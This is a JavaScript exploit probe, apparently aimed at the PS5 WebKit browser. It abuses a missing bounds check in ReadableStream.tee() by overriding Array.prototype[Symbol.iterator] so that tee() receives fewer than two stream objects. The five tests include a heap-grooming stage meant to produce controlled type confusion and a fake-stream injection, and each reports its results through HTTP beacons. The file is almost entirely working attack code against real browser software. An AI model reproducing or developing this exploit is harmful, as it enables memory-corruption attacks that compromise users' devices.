/*
 * p430 -- ReadableStream.tee() uninitialized memory read via Symbol.iterator
 *
 * InternalReadableStream::tee() at InternalReadableStream.cpp:191-195:
 *   auto results = SequenceConverter<IDLObject>::convert(*globalObject, result);
 *   ASSERT(results.size() == 2);  // COMPILED OUT ON PS5
 *   return pair(fromObject(*results[0].get()), fromObject(*results[1].get()));
 *
 * If Symbol.iterator override returns < 2 elements, results[1] is OOB.
 * fromObject() does NO type check -- wraps any JSObject& as a stream.
 *
 * Test A: Verify tee() calls Symbol.iterator on its return value
 * Test B: Return 1 element -- probe for crash vs behavior
 * Test C: Heap groom + return 1 element -- controlled type confusion
 * Test D: Return 0 elements -- probe for crash
 * Test E: Return 3 elements with a non-stream -- check handling
 *
 * Beacon prefix: V430-
 */
(function(){
"use strict";
var BQ = 0;
function B(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open("POST", "/beacon/V430-" + tag + "?q=" + (BQ++), false);
    x.setRequestHeader("Content-Type", "text/plain");
    x.send(typeof data === "object" ? JSON.stringify(data) : String(data || ""));
  } catch(e) {}
}

B("BOOT");

var origIter = Array.prototype[Symbol.iterator];

// ================================================================
// Test A: Count iterator calls during tee()
// ================================================================

function testA() {
  B("A-START");

  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("hello");
      controller.close();
    }
  });

  var iterCalls = [];
  var callIdx = 0;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;
    var id = callIdx++;
    var len = 0;
    try { len = self.length; } catch(e) {}

    var types = [];
    if (Array.isArray(self)) {
      for (var i = 0; i < Math.min(len, 4); i++) {
        try {
          var t = self[i];
          types.push(t && t.constructor ? t.constructor.name : typeof t);
        } catch(e) { types.push("err"); }
      }
    }

    iterCalls.push({id: id, len: len, types: types});
    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    B("A-TEE-OK", {
      len: branches.length,
      type0: branches[0] ? branches[0].constructor.name : "?",
      type1: branches[1] ? branches[1].constructor.name : "?"
    });
  } catch(e) {
    B("A-TEE-ERR", e.message.slice(0, 80));
  }

  Array.prototype[Symbol.iterator] = origIter;
  B("A-CALLS", {count: iterCalls.length, calls: iterCalls.slice(0, 8)});
}

// ================================================================
// Test B: Return 1 element from tee's iterator
// ================================================================

function testB() {
  B("B-START");

  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("data-b");
      controller.close();
    }
  });

  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;

    // Target the 2-element array from readableStreamTee return
    if (Array.isArray(self) && self.length === 2) {
      var t0 = "?", t1 = "?";
      try { t0 = self[0] && self[0].constructor ? self[0].constructor.name : typeof self[0]; } catch(e) {}
      try { t1 = self[1] && self[1].constructor ? self[1].constructor.name : typeof self[1]; } catch(e) {}

      // Only intercept if both look like ReadableStream (from tee)
      if (t0 === "Object" && t1 === "Object") {
        intercepted = true;
        B("B-INTERCEPT", {types: [t0, t1]});

        // Return only 1 element
        var items = [self[0]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }

    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    B("B-TEE-OK", {
      intercepted: intercepted,
      len: branches.length,
      type0: branches[0] ? branches[0].constructor.name : "null",
      type1: branches[1] ? (branches[1].constructor ? branches[1].constructor.name : typeof branches[1]) : "null"
    });

    // Try to use branch[1] if it exists
    if (branches[1]) {
      try {
        var reader = branches[1].getReader();
        B("B-READER1-OK", typeof reader);
        reader.read().then(function(r) {
          B("B-READ1", {done: r.done, val: typeof r.value});
        }).catch(function(e) {
          B("B-READ1-ERR", e.message.slice(0, 60));
        });
      } catch(e) {
        B("B-READER1-ERR", e.message.slice(0, 60));
      }
    }
  } catch(e) {
    B("B-TEE-ERR", {intercepted: intercepted, msg: e.message.slice(0, 80)});
  }

  Array.prototype[Symbol.iterator] = origIter;
}

// ================================================================
// Test C: Heap groom then tee with 1 element -- type confusion
// ================================================================

function testC() {
  B("C-START");

  // Phase 1: Heap groom -- create many objects to fill free list
  var groom = [];
  for (var i = 0; i < 1000; i++) {
    // Strong<JSObject> is ~8 bytes (pointer). Fill heap with known pointers.
    groom.push({marker: 0xDEADBEEF, idx: i});
  }

  // Phase 2: Create target objects that we want to confuse
  var targets = [];
  for (var i = 0; i < 100; i++) {
    var ab = new ArrayBuffer(64);
    new Uint32Array(ab).fill(0xCAFE0000 + i);
    targets.push({buffer: ab, view: new Uint8Array(ab)});
  }

  B("C-GROOMED", {groom: groom.length, targets: targets.length});

  // Phase 3: Create ReadableStream and tee with override
  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("data-c");
      controller.close();
    }
  });

  var intercepted = false;
  var stolenBranch1 = null;
  var stolenBranch2 = null;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;

    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      var t0 = "?";
      try { t0 = typeof self[0]; } catch(e) {}

      // Internal streams are plain Objects
      if (t0 === "object" && self[0] !== null) {
        intercepted = true;
        stolenBranch1 = self[0];
        stolenBranch2 = self[1];
        B("C-INTERCEPT");

        // Return only branch1
        var items = [self[0]];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }

    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    B("C-TEE-OK", {
      intercepted: intercepted,
      len: branches.length,
      type0: branches[0] ? branches[0].constructor.name : "null",
      type1: branches[1] ? branches[1].constructor.name : "null"
    });

    // Try using branch[1] which should be from uninitialized memory
    if (branches[1]) {
      B("C-BRANCH1-EXISTS", {
        ctor: branches[1].constructor ? branches[1].constructor.name : "?",
        type: typeof branches[1]
      });

      // Try to detect if it's a real ReadableStream or confused object
      try {
        var locked = branches[1].locked;
        B("C-LOCKED", {val: locked, type: typeof locked});
      } catch(e) {
        B("C-LOCKED-ERR", e.message.slice(0, 60));
      }

      try {
        var reader = branches[1].getReader();
        B("C-READER-OK");
      } catch(e) {
        B("C-READER-ERR", e.message.slice(0, 60));
      }
    } else {
      B("C-BRANCH1-NULL");
    }
  } catch(e) {
    B("C-TEE-ERR", {msg: e.message.slice(0, 80), intercepted: intercepted});
  }

  Array.prototype[Symbol.iterator] = origIter;

  // Keep groom/targets alive
  B("C-ALIVE", {groom: groom.length, targets: targets.length});
}

// ================================================================
// Test D: Return 0 elements -- most aggressive
// ================================================================

function testD() {
  B("D-START");

  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("data-d");
      controller.close();
    }
  });

  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;

    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      var t0 = "?";
      try { t0 = typeof self[0]; } catch(e) {}

      if (t0 === "object" && self[0] !== null) {
        intercepted = true;
        B("D-INTERCEPT");

        // Return 0 elements
        return {
          next: function() {
            return {done: true};
          }
        };
      }
    }

    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    B("D-TEE-OK", {intercepted: intercepted, len: branches.length});
  } catch(e) {
    B("D-TEE-ERR", {intercepted: intercepted, msg: e.message.slice(0, 80)});
  }

  Array.prototype[Symbol.iterator] = origIter;
}

// ================================================================
// Test E: Return 2 elements but second is non-stream
// ================================================================

function testE() {
  B("E-START");

  var rs = new ReadableStream({
    start: function(controller) {
      controller.enqueue("data-e");
      controller.close();
    }
  });

  var fakeStream = {marker: "FAKE", x: 0x41414141};
  var intercepted = false;

  Array.prototype[Symbol.iterator] = function() {
    var self = this;

    if (Array.isArray(self) && self.length === 2 && !intercepted) {
      var t0 = "?";
      try { t0 = typeof self[0]; } catch(e) {}

      if (t0 === "object" && self[0] !== null) {
        intercepted = true;
        B("E-INTERCEPT");

        // Return branch1 + our fake object
        var items = [self[0], fakeStream];
        var idx = 0;
        return {
          next: function() {
            if (idx < items.length) return {value: items[idx++], done: false};
            return {done: true};
          }
        };
      }
    }

    return origIter.call(self);
  };

  try {
    var branches = rs.tee();
    B("E-TEE-OK", {
      intercepted: intercepted,
      len: branches.length,
      type1: branches[1] ? branches[1].constructor.name : "null"
    });

    // Try to use the fake stream
    if (branches[1]) {
      try {
        var reader = branches[1].getReader();
        B("E-READER-OK", typeof reader);
      } catch(e) {
        B("E-READER-ERR", e.message.slice(0, 60));
      }

      // Check if the fake stream's properties leak through
      try {
        B("E-PROPS", {
          marker: branches[1].marker,
          locked: branches[1].locked
        });
      } catch(e) {
        B("E-PROPS-ERR", e.message.slice(0, 60));
      }
    }
  } catch(e) {
    B("E-TEE-ERR", {intercepted: intercepted, msg: e.message.slice(0, 80)});
  }

  Array.prototype[Symbol.iterator] = origIter;
}

// Run tests in order -- A first for diagnostics
testA();
testB();
testC();
testD();
testE();

setTimeout(function() { B("DONE"); }, 3000);
})();
